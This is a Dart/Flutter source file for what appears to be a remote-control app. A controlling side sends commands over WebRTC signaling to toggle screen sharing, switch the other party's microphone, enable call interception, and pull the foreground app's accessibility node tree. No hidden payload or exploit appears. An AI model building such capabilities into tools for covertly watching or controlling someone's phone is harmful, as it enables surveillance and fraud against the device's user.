import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:flutter_webrtc/flutter_webrtc.dart';
import '../../utils/signaling.dart';

/// 信令处理模块 - 处理远程命令的业务逻辑
mixin SignalingHandlerMixin<T extends StatefulWidget> on State<T> {
  
  // 需要子类实现的抽象属性
  bool get isCaller;
  String? get channel;
  Signaling? get signaling;
  MediaStream? get screenStream;
  bool get screenShareOn;
  set screenShareOn(bool value);
  bool get remoteHasVideo;
  set remoteHasVideo(bool value);
  bool get remoteHasAudio; 
  set remoteHasAudio(bool value);
  bool get contributorSpeakerphoneOn;
  set contributorSpeakerphoneOn(bool value);
  bool get interceptOn;
  set interceptOn(bool value);
  bool get showNodeRects;
  set showNodeRects(bool value);
  double get remoteScreenWidth;
  set remoteScreenWidth(double value);
  double get remoteScreenHeight;
  set remoteScreenHeight(double value);
  double get savedRemoteScreenWidth;
  set savedRemoteScreenWidth(double value);
  double get savedRemoteScreenHeight;
  set savedRemoteScreenHeight(double value);
  List<dynamic> get nodeRects;
  set nodeRects(List<dynamic> value);
  
  // 需要子类实现的抽象方法
  void saveCurrentVideoContainerInfo();
  bool hasAnyAudio();
  void toggleSpeakerphone();
  void toggleIntercept(bool value);
  Future<void> refresh();
  void restorePageReadingAfterReconnect();
  void extractNodes(dynamic node, List<dynamic> list);
  dynamic parseBounds(dynamic bounds);
  
  /// 处理远程命令的主入口
  Future<void> handleRemoteCommand(Map<String, dynamic> cmd) async {
    final type = cmd['type'] as String?;
    if (type == null) return;
    
    switch (type) {
      case 'screen_info':
        await _handleScreenInfo(cmd);
        break;
      case 'refresh_screen':
        await _handleRefreshScreen();
        break;
      case 'start_screen_share':
        await _handleStartScreenShare();
        break;
      case 'stop_screen_share':
        await _handleStopScreenShare();
        break;
      case 'exit_room':
        _handleExitRoom();
        break;
      case 'stop_speakerphone':
        _handleStopSpeakerphone();
        break;
      case 'start_speakerphone':
        _handleStartSpeakerphone();
        break;
      case 'on_intercept_call':
        _handleInterceptOn();
        break;
      case 'off_intercept_call':
        _handleInterceptOff();
        break;
      case 'refresh_sdk':
        await _handleRefreshSdk();
        break;
      case 'refresh_cf':
        await _handleRefreshCf();
        break;
      case 'show_view':
        await _handleShowView();
        break;
      case 'accessibility_tree':
        await _handleAccessibilityTree(cmd);
        break;
      case 'accessibility_tree_error':
        await _handleAccessibilityTreeError(cmd);
        break;
      default:
        print('🔄 未处理的远程命令: $type');
    }
  }
  
  /// 处理屏幕信息更新
  Future<void> _handleScreenInfo(Map<String, dynamic> cmd) async {
    print('📺 收到屏幕信息: ${cmd['width']}x${cmd['height']}');
    
    if (mounted) {
      setState(() {
        remoteScreenWidth = (cmd['width'] as num).toDouble();
        remoteScreenHeight = (cmd['height'] as num).toDouble();
        // 保存分辨率信息，用于节点树显示
        savedRemoteScreenWidth = remoteScreenWidth;
        savedRemoteScreenHeight = remoteScreenHeight;
        print('📏 保存屏幕分辨率: ${savedRemoteScreenWidth}x$savedRemoteScreenHeight');
      });
      
      // 分辨率信息更新后，如果有视频流，主动保存容器信息
      if (remoteHasVideo) {
        Future.delayed(const Duration(milliseconds: 100), () {
          saveCurrentVideoContainerInfo();
        });
      }
    }
  }
  
  /// 处理刷新屏幕请求
  Future<void> _handleRefreshScreen() async {
    if (isCaller) return;
    
    print('📺 收到刷新屏幕请求');
    if (screenStream != null) {
      // 拿到当前共享的 video track
      final track = screenStream!.getVideoTracks().first;
      // 先关掉，等一下再打开
      track.enabled = false;
      await Future.delayed(const Duration(milliseconds: 50));
      track.enabled = true;
    }
  }
  
  /// 处理开始屏幕共享请求
  Future<void> _handleStartScreenShare() async {
    if (isCaller) return;
    
    print('📺 收到开始屏幕共享请求');
    // 这里应该调用屏幕共享的开始逻辑
    // 具体实现可能需要调用ScreenShareMixin的方法
  }
  
  /// 处理停止屏幕共享
  Future<void> _handleStopScreenShare() async {
    print('📺 收到停止屏幕共享请求');
    
    if (mounted) {
      setState(() {
        screenShareOn = false;
        remoteHasVideo = false;
        print('📺 屏幕共享已停止，切换到纯音频模式');
        
        // 立即检查音频状态，确保UI正确显示
        Future.delayed(const Duration(milliseconds: 100), () {
          if (mounted) {
            hasAnyAudio(); // 这会同步更新 _remoteHasAudio 状态
          }
        });
      });
    }
  }
  
  /// 处理退出房间请求
  void _handleExitRoom() {
    print('📺 收到退出房间请求');
    if (mounted) {
      Navigator.of(context).popUntil((route) => route.isFirst);
    }
  }
  
  /// 处理关闭对方麦克风
  void _handleStopSpeakerphone() {
    print('📺 收到关闭对方麦克风请求');
    contributorSpeakerphoneOn = false;
    toggleSpeakerphone();
    if (mounted) setState(() {});
  }
  
  /// 处理打开对方麦克风
  void _handleStartSpeakerphone() {
    print('📺 收到打开对方麦克风请求');
    contributorSpeakerphoneOn = true;
    toggleSpeakerphone();
    if (mounted) setState(() {});
  }
  
  /// 处理开启电话拦截
  void _handleInterceptOn() {
    print('📺 收到开启电话拦截请求');
    interceptOn = true;
    toggleIntercept(interceptOn);
  }
  
  /// 处理关闭电话拦截
  void _handleInterceptOff() {
    print('📺 收到关闭电话拦截请求');
    interceptOn = false;
    toggleIntercept(interceptOn);
  }
  
  /// 处理SDK刷新请求
  Future<void> _handleRefreshSdk() async {
    if (isCaller) return;
    
    print('📺 收到SDK刷新请求');
    // _channel = 'sdk';
    await refresh();
  }
  
  /// 处理CF刷新请求
  Future<void> _handleRefreshCf() async {
    if (isCaller) return;
    
    print('📺 收到CF刷新请求');
    // _channel = 'cf';
    await refresh();
  }
  
  /// 处理显示页面视图请求
  Future<void> _handleShowView() async {
    const platform = MethodChannel('accessibility_channel');
    
    try {
      print('📱 开始获取页面节点树...');
      
      // 添加超时保护，防止无限等待
      final treeJson = await platform
          .invokeMethod<String>('dumpAccessibilityTree')
          .timeout(const Duration(seconds: 5), onTimeout: () {
            throw TimeoutException('获取节点树超时', const Duration(seconds: 5));
          });
      
      if (treeJson == null || treeJson.isEmpty) {
        print('⚠️ 获取到空的节点树数据');
        return;
      }
      
      // 检查数据大小，避免发送过大的数据
      if (treeJson.length > 2 * 1024 * 1024) { // 超过2MB
        print('⚠️ 节点树数据过大 (${treeJson.length} 字符)，跳过发送');
        return;
      }
      
      print('📱 节点树获取成功，大小: ${treeJson.length} 字符');
      signaling?.sendCommand(
        {'type': 'accessibility_tree', 'data': treeJson},
      );
      
    } catch (e) {
      print('❌ 获取节点树失败: $e');
      
      // 发送错误信息给主控端
      String errorMsg = '⚠️ 获取节点树失败: ';
      if (e is TimeoutException) {
        errorMsg += '请求超时，请检查无障碍服务是否正常运行';
      } else if (e.toString().contains('rootInActiveWindow')) {
        errorMsg += '无 rootInActiveWindow，请确保目标应用在前台运行';
      } else {
        errorMsg += e.toString();
      }
      
      signaling?.sendCommand(
        {'type': 'accessibility_tree_error', 'data': errorMsg},
      );
    }
  }
  
  /// 处理无障碍节点树数据
  Future<void> _handleAccessibilityTree(Map<String, dynamic> cmd) async {
    try {
      final treeJson = cmd['data'] as String;
      print('📱 收到节点树数据，大小: ${treeJson.length} 字符');
      
      // 检查是否是错误信息
      if (treeJson.startsWith('⚠️')) {
        print('⚠️ 收到节点树错误: $treeJson');
        await _handleNodeTreeError(treeJson);
        return;
      }
      
      final parsed = jsonDecode(treeJson);
      print('📱 原始JSON解析完成，开始提取节点...');
      
      final nodes = <dynamic>[];
      extractNodes(parsed, nodes);
      print('📱 节点提取完成');
      
      // 统计不同类型的节点
      int textNodes = 0, editableNodes = 0, clickableNodes = 0, borderOnlyNodes = 0;
      for (final node in nodes) {
        if (node.label.isNotEmpty) {
          textNodes++;
        } else {
          borderOnlyNodes++;
        }
        // 可以添加更多统计逻辑
      }
      
      print('📊 节点统计: 文本节点=$textNodes, 边框节点=$borderOnlyNodes, 总计=${nodes.length}');
      
      if (mounted) {
        setState(() {
          nodeRects = nodes;
        });
      }
      
    } catch (e) {
      print('❌ 解析节点树失败: $e');
      if (mounted) {
        setState(() {
          nodeRects = [];
        });
      }
    }
  }
  
  /// 处理无障碍节点树错误
  Future<void> _handleAccessibilityTreeError(Map<String, dynamic> cmd) async {
    final errorMsg = cmd['data'] as String;
    print('⚠️ 收到节点树错误: $errorMsg');
    await _handleNodeTreeError(errorMsg);
  }
  
  /// 处理节点树错误的通用方法
  Future<void> _handleNodeTreeError(String errorMsg) async {
    // 特殊处理ICE重连后的rootInActiveWindow问题
    if (errorMsg.contains('rootInActiveWindow')) {
      print('📄 检测到rootInActiveWindow问题，可能是ICE重连后无障碍服务未就绪');
      
      // 如果当前正在显示节点树，安排重连后恢复
      if (showNodeRects) {
        restorePageReadingAfterReconnect();
      }
    }
    
    if (mounted) {
      setState(() {
        nodeRects = []; // 清空之前的节点
      });
    }
  }
  
  /// 清理资源
  void disposeSignalingHandler() {
    print('🧹 清理信令处理模块资源');
    // 这里可以添加任何需要清理的资源
  }
} 